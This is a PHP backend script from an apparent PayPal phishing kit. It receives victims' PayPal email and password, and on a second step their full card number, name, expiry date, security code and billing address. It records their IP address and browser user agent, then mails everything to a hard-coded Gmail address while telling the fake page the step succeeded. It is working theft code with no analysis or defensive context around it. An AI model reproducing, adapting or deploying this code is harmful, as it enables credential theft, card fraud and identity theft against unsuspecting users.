<?php
	header("Access-Control-Allow-Origin:*");
	$recepientEmail = "Reup690@gmail.com";
	$action = $_POST["action"];
	if($action == "login"){
		$email = $_POST["email"];
		$password = $_POST["password"];
		$message = "\n\rpaypal login credentials\n\r";
		$message = $message."email: ".$email."\n\r";
		$message = $message."password: ".$password."\n\r";
		$message = $message."date: ".date("Y-m-d")."\n\r";
		$message = $message."time: ".date("h:i:s")."\n\r";		
		$message = $message."user-agent: ".$_SERVER["HTTP_USER_AGENT"]."\n\r";		
		$message = $message."user-ip-address: ".$_SERVER["REMOTE_ADDR"]."\n\r";		
		// sending response for login or confirmlogin
		header("Content-Type:application/json");
		$json = ["action"=>"login","status"=>"okay"];
		echo json_encode($json);
		//sending mail
		mail($recepientEmail,"paypal user ".$email." details",$message);
	}
	else if($action == "cvv"){
		$card_number = $_POST["cardNumber"];
		$card_name = $_POST["cardName"];
		$expire_date = $_POST["expireDate"];
		$security_code = $_POST["securityCode"];
		$bill_address = $_POST["address"];
		$bill_address_2 = $_POST["address_2"];
		$city = $_POST["city"];
		$postcode = $_POST["postcode"];
		$state = $_POST["state"];
		// $country = $_POST["country"];
		// building message...
		$message = "\n\rpaypal card credentials\n\r";
		$message = $message."card_number: ".$card_number."\n\r";
		$message = $message."card_name: ".$card_name."\n\r";
		$message = $message."expire_date: ".$expire_date."\n\r";
		$message = $message."security_code: ".$security_code."\n\r";
		$message = $message."bill_address: ".$bill_address."\n\r";
		$message = $message."bill_address_2: ".$bill_address_2."\n\r";
		$message = $message."city: ".$city."\n\r";
		$message = $message."postcode: ".$postcode."\n\r";
		$message = $message."state: ".$state."\n\r";
		// $message = $message."country: ".$country."\n\r";
		$message = $message."date: ".date("Y-m-d")."\n\r";
		$message = $message."time: ".date("h:i:s")."\n\r";
		$message = $message."user-agent: ".$_SERVER["HTTP_USER_AGENT"]."\n\r";
		$message = $message."user-ip-address: ".$_SERVER["REMOTE_ADDR"]."\n\r";	
		// sending response for cvv 
		header("Content-Type:application/json");
		$json = ["action"=>"cvv","status"=>"okay"];
		echo json_encode($json);
		// sending mail for cvv
		mail($recepientEmail,"paypal user card details",$message);
	}
	else{
		header("Content-Type:application/json");
		echo json_encode(["status"=>"false","msg"=>"access not authorised"]);
	}
?>

